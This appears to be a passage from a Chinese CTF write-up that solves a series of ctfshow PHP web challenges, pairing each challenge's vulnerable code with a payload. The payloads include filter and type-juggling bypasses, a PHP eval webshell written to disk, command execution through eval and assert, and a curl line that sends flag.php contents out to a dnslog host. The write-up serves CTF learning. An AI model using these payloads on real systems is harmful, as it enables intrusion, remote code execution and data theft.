?cmd=%0aphp\n\n/^php$/：正则表达式，匹配开始和结束位置，简单来说就是参数值为php\ni：不区分大小写\nm：多行匹配\n\nweb92(弱比较)if (isset($_GET[&#x27;num&#x27;])) &#123;    $num = $_GET[&#x27;num&#x27;];    if ($num == 4476) &#123;        die(&quot;no no no!&quot;);    &#125;    if (intval($num, 0) == 4476) &#123;        echo $flag;    &#125; else &#123;        echo intval($num, 0);    &#125;&#125;\n\npayload: ?num=010574 or 4476e1\n\n==：在进行比较的时候，会先将字符串类型转化成相同类型，再比较\n\nweb93(进制转换)if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n\npayload: ?num=010574\n\nintval():  第二个参数为0时，通过对变量检测来判断\n0b??：二进制\n0???：八进制\n0x??：十六进制\n\n\n\nweb94(strpos)if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n\npayload: ?num= 010574\n\nstrpos()：返回在字符串首次出现的位置，如果没找到返回false\n\nweb95(strpos，intval，==，===)if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n\npayload: ?num= 010574\nweb96(php://filter/)if(isset($_GET[&#x27;u&#x27;]))&#123;    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#x27;u&#x27;]);    &#125;&#125;\n\npayload: ?u=php://filter/resource=flag.php\n\nhighlight_file()：打印输出或者返回文件中语法高亮版本的代码\n利用伪协议读取文件内容\n\nweb97(md5)if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;\n\npayload: a[]=1&amp;b[]=1\n\nmd5强比较，数组绕过\n原理：md5()参数为数组时，不会报错，返回值为null\n\nweb98(=&amp;)$flag=&quot;flag is here&quot;;$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);\n\npayload: HTTP_FLAG=flag\n\n=&amp;：值或对象都将指向相同的数据    引用\nget和post都指向相同的数据，而get又与cookie和server指向相同的数据，但题要求用get传参，所以使用post传参来替代get传参\n\nweb99(file_put_contents)$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123;    array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;\n\npayload: ?n=1.php    content=&lt;?php eval($_POST[&#39;x&#39;]);?&gt;    蚁剑连接\n\narray_push()：将一个或者多个数据存入数组中\nin_array()：检查数组中是否存在某个值 \nfile_put_contents()：将数据写入文件中\n\n\n当in_array()检查的数据为数字加字符串时，会截取第一个非数字字符前的所有数字作为检查的对象，所以可以传1.php，在该函数中表现的是检测1是否存在，这样就绕过了该函数\n写入文件的内容是什么呢？目的是为了获得路径，读取目录，进而得到flag所以可以写入一句话木马，用蚁剑连接，获得flag\n\nweb100(ReflectionClass)//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125; \n\npayload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;\n\n根据提示，得出flag在ctfshow()类中\n在外层if判断只需让v0为真即可，v0为真，只需让is_numeric($v1)为真即可\n第二层if判断中，不能有;，第三层if中必须有;\n根据php特性中的反射类相关知识，构造一个反射类，将ctfshow()相关信息，用echo打印出来即可\n\nweb101(ReflectionClass)$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123;        if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125; \n\npayload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;\n\n正则过滤了一大堆东西，实际上payload跟上个题一样\n\nweb102(call_user_func)$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);    $str = call_user_func($v1,$s);    echo $str;    file_put_contents($v3,$str);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;\n\npayload: ?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php    v1=hex2bin\n\nis_numeric()：检测变量是否为数字或数字字符串（可以利用科学计数法绕过）\n\ncall_user_func()：把第一个参数作为回调函数调用（其余参数为回调函数的参数）\n\n解题思路：\n\nv4需为真，则v2需为数字或者为科学计数法形式的数字字符串\n根据第六行得出，对v2需要进行特殊处理——从第二个字符开始算起\n对经过处理的v2进行某种函数操作，v1需为函数名\n将处理后的数据写入文件中，v3需为文件名\n\n\ncall_user_func()函数可与hex2bin()函数搭配使用（hex2bin()：将十六进制文本转换为ASCII码字符）\n\n\n/*  * v2为写入文件的内容\t要求：该数据的base64编码后的数据的十六进制是纯数字或者科学计数法形式 * 例：&lt;?=`cat *`; * base64编码为：PD89YGNhdCAqYDs * 十六进制转换为：5044383959474e6864434171594473 * 因为substr使得数据从第二位开始截取，所以需在前面加两位数字 * v2=115044383959474e6864434171594473 * 因为要对v2进行十六进制转换base64，所以v1为hex2bin函数 * 数据最后后为base64编码形式 * 所以需利用伪协议写入文件，条件是base64编码 * v3=php://filter/write=convert.base64-decode/resource=1.php */\n\nweb103(call_user_func)$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);    $str = call_user_func($v1,$s);    echo $str;    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;        file_put_contents($v3,$str);    &#125;    else&#123;        die(&#x27;Sorry&#x27;);    &#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125; \n\npayload: ?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php    v1=hex2bin\n\nif表达式中不能出现php，但是我们经过处理的数据也不存在php\n所payload跟上道题一样\n\nweb104(sha1)if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(sha1($v1)==sha1($v2))&#123;        echo $flag;    &#125;&#125;\n\npayload: ?v2[]=1    v1[]=1\n\n数组绕过\n\nweb105(foreach)error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123;    if($key===&#x27;error&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;foreach($_POST as $key =&gt; $value)&#123;    if($value===&#x27;flag&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;    die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces);\n\npayload: ?fff=flag error=fff\n\n 遍历数组，使用foreach，必须使用数组\n\n 代码分析：\n\n\n\n看源码，能输出数据的只有$flag $error $suces三个变量\n\nforeach($_GET as $key =&gt; $value)&#123;    if($key===&#x27;error&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;\n\n\n第一个foreach将我们传入的变量=值以键值对的形式进行赋值$key=变量 $value=值经过第五行的变量覆盖处理得到覆盖后的数据$$key=$变量 $$value=$值并且$key不等于error\n\nforeach($_POST as $key =&gt; $value)&#123;    if($value===&#x27;flag&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;\n\n\n第二个foreach将我们传入的变量=值以键值对的形式进行赋值$key=变量 $value=值经过第五行的变量覆盖处理得到覆盖后的数据$$key=$变量 $$value=$值并且$value不等于flag\n\nif(!($_POST[&#x27;flag&#x27;]==$flag))&#123;    die($error);&#125;\n\n\n第三段if判断POST传入的值不为变量flag，则输出变量error\n\n\n解题思路：\n可以利用error进行输出，只需要POST传入的值不为flag变量即可\nGET传参：?fff=flag  \n$key=$fff  $value=$flag =&gt; $fff=$flag\n\n\nPOST传参：?error=fff\n$key=$error $value=$fff =&gt; $error=$fff\n\n\n将$flag的值赋值给$error，输出$error即可\n满足if判断，即可输出flag\n\n\n\nweb106(sha1)if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;        echo $flag;    &#125;&#125; \n\npayload: ?v2[]=1 v1[]=2\n\n数组绕过，只需要让值不同即可\n\nweb107(parse_str)if(isset($_POST[&#x27;v1&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v3 = $_GET[&#x27;v3&#x27;];       parse_str($v1,$v2);       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;           echo $flag;       &#125;&#125; \n\npayload: ?v3[]=1 v1=&#39;flag=0&#39;\n\nparse_str()：将第一个参数作为数组元素存入第二个变量中\n存数组的变量为$v2，且if中判断索引值为flag的值是否和v3经过md5加密的数据相等\n所以POST传入&#39;flag=0&#39;（注意：POST传参需要用单引号）\nGET可以传入数组进行绕过\n\nweb108(strrev)if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;    die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;\n\npaylad: ?c=a%00778\n\nstrrev()：字符串反转，但%00不会反转（%00是一个整体，不会反转成00% ）\n第一个if需要GET传入的参数有字母才能绕过\n第二个if将传入的数据反转后为0x36d（877）才能输出flag\n可以利用00截断，在第一个if判断时截断，使得检测出的数据只有字母，在第二个if判断时，检测反转后的数据，将字母截断，使数据只有数字877\n\nweb109(ReflectionClass(system()))if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;            eval(&quot;echo new $v1($v2());&quot;);    &#125;&#125; \n\npayload: ?v1=ReflectionClass&amp;v2=system(&#39;cat fl36dg.txt&#39;)\n\n从if判断中得出传入的参数需为字母\n经过代码执行，输出一个数据\n因为new可以得出，大概率是输出一个类\n所以可以利用反射类ReflectionClass(system())加命令来操作\n\nweb110(FilesystemIterator(getcwd()))if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;);&#125; \n\npayload: ?v1=FilesystemIterator&amp;v2=getcwd 访问文件\n\n过滤了一大堆东西，上道题的payload不能用了\n利用内置类读文件\nFilesystemIterator(getcwd())返回、\nFilesystemIterator获取指定目录下的所有文件\ngetcwd()函数：获取当前工作目录 返回当前工作目录\n\n\n得到文件名字后，直接访问该文件\n\nweb111($GLOBALS)function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125; \n\npayload: ?v1=ctfshow&amp;v2=GLOBALS\n\n根据代码发现唯一可能得到flag的地方在getflag这个方法里\n两个if对传入的数据分别过滤了一大堆东西\n第三个if发现v1的值需为ctfshow才能执行这个getflag方法\n在getflag方法里\neval将两个变量进行了引用，所以第二个参数我们传全局变量\n通过变量覆盖，使输出的数据为$GLOBALS\n\n\n\nweb112(is_file)function filter($file)&#123;    if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125; \n\npayload: ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n\nis_file()：判断给定文件名是否为一个正常的文件，参数为文件路径\n\n在linux中/proc/self/root是指向根目录的\n\n多次上面的操作可以绕过is_file\n\n\nweb113(is_file)function filter($file)&#123;    if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;        die(&#x27;hacker!&#x27;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;\n\npayload: ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\nweb114(php://filter/)error_reporting(0);highlight_file(__FILE__);function filter($file)&#123;    if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;        die(&#x27;hacker!&#x27;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;\n\npayload: ?file=php://filter/resource=flag.php\n\n发现root被过滤了，读取文件用伪协议\n\nweb115(is_numeric，str_replace，trim)error_reporting(0);function filter($num)&#123;    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;$num=$_GET[&#x27;num&#x27;];if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;    if($num==&#x27;36&#x27;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;else&#123;    echo &quot;hacker!!!&quot;;&#125; hacker!!!\n\npayload: ?num=%0c36\n\nstr_replace($search ,$replace , $subject)：\n参数：第一个参数是目标字符，第二个参数是要替换的字符，第三个参数是进行替换的原字符串\n返回值：一个字符串或者数组\n\n\ntrim()：去除字符串首尾处的空白字符\nis_numeric()可以用空格+数字绕过但是trim把空白字符过滤了\n那么可以使用%0c绕过trim\n\n\n$num!==&#39;36&#39;和$num==&#39;36&#39;区别：\n!==：只要类型不同就不全等\n\n\n所以加上%0c换页符，在==进行类型转换，所有%0c36会被转换为数值36，结果true；在!==不进行类型转换，所以字符串和数值比较，类型不同，结果true。\n\nweb123([=&gt;_)error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125; \n\npayload: fun=echo $flag&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1\n\n!isset($_GET[&#39;fl0g&#39;])和$fl0g===&quot;flag_give_me&quot;冲突：\n所以GET传参不能传参数，而且源码自带的输出flag也不能利用，能利用的只有它提供的eval函数\n\n\n\n\nPHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。如：/?CTF=ctf变成Array([CTF] =&gt; &quot;ctf&quot;)。查询字符串在解析的过程中会删除空白符，同时将某些字符删除或用下划线代替。如，/?CTF[SHOW=42会转换为Array([CTF_SHOW] =&gt; 42)。\n\nweb125($_SERVER[‘argv’])include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);         if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125; \n\npayload: ?$fl0g=flag_give_me    fun=assert($a[0])&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1\n\n网页模式下：$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n$_SERVER[&quot;QUERY_STRING&quot;]：获取的是?后面的值\nassert()： 检查一个断言是否为FALSE\n\nPHP 5assert ( mixed $assertion [, string $description ] ) : bool    PHP 7assert ( mixed $assertion [, Throwable $exception ] ) : boolassert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。\n\n\n所以我们get传入的数据会保存到一个索引为0的数组中，且会被当作php脚本执行POST参数中：因为过滤了echo，所以可以利用断言函数assert来执行上述数组，从而让$fl0g=flag_give_me\n\nweb126($_SERVER[‘argv’])error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;\n\npayload: ?$fl0g=flag_give_me    fun=assert($a[0])&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1\n\n过滤了flag还有一堆字母，但是是针对POST参数，GET参数不影响，所以payload跟上道题一样\n\nweb127($_SERVER[‘QUERY_STRING’])error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show = md5($flag);$url = $_SERVER[&#x27;QUERY_STRING&#x27;];//特殊字符检测function waf($url)&#123;    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;if(waf($url))&#123;    die(&quot;嗯哼？&quot;);&#125;else&#123;    extract($_GET);&#125;if($ctf_show===&#x27;ilove36d&#x27;)&#123;    echo $flag;&#125;\n\npayload: ?ctf[show=ilove36d\n\n源码将$ctf_show赋值为经过md5加密后的flag\n想要输出flag，只能将$ctf_show重新赋值\n$_SERVER[&#39;QUERY_STRING&#39;]将?后面的数据以键值对的形式保存下来\n又因为有个特殊符号检测，过滤了一大堆字符\n所以可以利用[代替_重新将$ctf_show赋值\n\nweb128(gettext()，get_defined_vars)error_reporting(0);include(&quot;flag.php&quot;);$f1 = $_GET[&#x27;f1&#x27;];$f2 = $_GET[&#x27;f2&#x27;];if(check($f1))&#123;    var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123;    echo &quot;嗯哼？&quot;;&#125;function check($str)&#123;    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);&#125;\n\npayload: ?f1=_&amp;f2=get_defined_vars\n\n对f1参数进行了过滤\n_()==gettext()：翻译内容\nget_defined_vars：\n返回由所有已定义变量所组成的数组\n变量包括环境变量、服务器变量和用户定义的变量\n\n\n\n\n因为调用了两次回调函数所以外层回调调用的应该是一个函数，所以内层回调的结果应该是一个函数名字要想得到函数名字，需要调用gettext()函数，来将get_defined_vars输出\n\nweb129(stripos，readfile)error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;f&#x27;]))&#123;    $f = $_GET[&#x27;f&#x27;];    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;        echo readfile($f);    &#125;&#125;\n\npayload: ?f=./ctfshow/../flag.php\n\nstripos($haystack , $needle) 查找字符串首次出现的位置（不区分大小写）\n$haystack：在该字符串中查找\n$needle：目标字符串\n\n\nreadfile()输出文件\n\n\n传入参数需存在ctfshow字符串，且不在第一个位置访问ctfshow.php发现没有数据所以猜测ctfshow可能是个目录继续寻找当前目录没有数据，测试上层目录发现flag\n或者可以使用php伪协议读取目录，伪协议中需要加上ctfshow\n\nweb130(stripos)error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123;    $f = $_POST[&#x27;f&#x27;];    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;&#125; \n\npayload: f=ctfshow\n\n抱着试一试的心态随便传了个参数，没想到flag就出来了0.o\n第二个if判断让我们传入的参数需含有ctfshow\n正则匹配会匹配ctfshow前面的字符，要想绕过此if判断，ctfshow前不能有字符\n\nweb131(最大回溯次数绕过)error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123;    $f = (String)$_POST[&#x27;f&#x27;];    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;&#125; \n\npayload: f=ctfshow*100000036Dctfshow\n\n+?看到这个一般都是最大回溯次数\n传1000000个ctfshow绕过第一个if判断\n最后传个36Dctfshow得到flag\n\nweb132(敏感文件)\n是个正常的网站，利用敏感文件/robots.txt\n或者拿御剑扫目录\n\nif(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;    $username = (String)$_GET[&#x27;username&#x27;];    $password = (String)$_GET[&#x27;password&#x27;];    $code = (String)$_GET[&#x27;code&#x27;];    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;                if($code == &#x27;admin&#x27;)&#123;            echo $flag;        &#125;            &#125;&#125; \n\npayload: ?username=admin&amp;password[]=1&amp;code=admin\n\nmt_rand：生成更好的随机数\n\n按照要求来构造参数\n\nusername=admin\ncode=admin\npassword用数组绕过\n\n\n\nweb133(无回显rce，dnslog外带)error_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123;    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;6个字母都还不够呀?!&quot;);    &#125;&#125;\n\npayload: ?F=`$F `;curl `cat flag.php`.k4t3vw.dnslog.cn\n\nsubstr($F,0,6)：从0位置开始截取6个长度。\n`和shell_exec`等价\n解题思路：\n\n\n因为参数只能为六个字符，所以命令执行函数只有``了\n又因为需要传命令，但是六个字符肯定不够用，所以考虑变量覆盖，用$F替换F，从而达到超出六个字符执行命令的结果\n因为没有回显，所以只能将结果用别的方法输出出来，这里用的是Dnslog外带数据\n将F覆盖后，利用curl将命令与dnslog的二级域名一起带出来，在解析的过程中，会将``里面的数据当作命令执行，从而达到将数据带出。\n\nweb134(parse_str&amp;extract)highlight_file(__FILE__);$key1 = 0;$key2 = 